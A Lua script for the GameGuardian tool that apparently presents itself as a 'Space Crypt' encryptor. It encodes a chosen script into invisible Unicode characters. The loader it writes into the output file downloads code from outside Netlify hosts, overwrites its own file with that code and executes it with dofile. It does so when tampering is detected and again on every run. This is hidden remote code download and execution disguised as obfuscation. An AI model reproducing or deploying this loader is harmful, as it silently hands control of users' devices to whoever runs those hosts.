local path = gg.prompt({"plz, path input"}, {"/sdcard/Download/"}, {"file"});
if path then
    gg.toast("暗号を開始");
    local fr = io.open(path[1], "r");
    local pro = fr:read("a");
    pro = "⁪"..table.concat(gg.bytes(pro), "⁪⁪").."⁪"; --170
    fr:close();

    --[[Space Crypt v3]]
    local pawn = {};
    for i, v in ipairs({"⁠", "⁡", "⁢", "⁣", "⁤", "⁥", "⁫", "⁬", "⁭", "⁮"}) do   --160~165, 171~174
        pawn[i-1] = v;
    end
    for i, v in pairs(pawn) do
        pro = pro:gsub(i, v);
    end
    pro = "local pro = \""..pro.."\";\n";

    --[[Space Crypt v2]]
    local trap = gg.bytes('gg.alert("解読しないでください。");print("Space Scrypt: プログラムの復号");gg.setVisible(true);os.exit();');
    for i = 1, #trap do
        trap[i] = "‌‍"..string.rep("​", trap[i]+21);
    end
    trap = "----Space暗号 "..table.concat(trap).."‌";

    local fw = io.open("index.lua", "w");
    fw:write(trap.."\n"..pro);
    fw:write([[local fr = io.open(gg.getFile():match("[^/]+$"), "r");
v0 = fr:read("a");
fr:close();

gg.setVisible(false);
if v0:find(string.char(112,114,105,110,116)) then
    local v1 = gg.makeRequest("https://ggsx.netlify.app/system/spacecrypt.lua");
    pcall(function()
        local fw = io.open(gg.getFile():match("[^/]+$"), "w");
        fw:write(v1.content);
        fw:close();
        return dofile(gg.getFile():match("[^/]+$"));
    end);
else
    pcall(function()
        local fw = io.open(gg.getFile():match("[^/]+$"), "w");
        for i, v in ipairs({"⁠", "⁡", "⁢", "⁣", "⁤", "⁥", "⁫", "⁬", "⁭", "⁮"}) do
            pro = pro:gsub(v, i-1);
        end
        for i in pro:gmatch("⁪(.-)⁪") do
            fw:write(string.char(i));
        end
        fw:close();
        return dofile(gg.getFile():match("[^/]+$"));
    end);
end
local fw = io.open(gg.getFile():match("[^/]+$"), "w");
fw:write(gg.makeRequest("https://scrty.netlify.app/index.lua").content);
fw:close();]]);
    fw:close();
end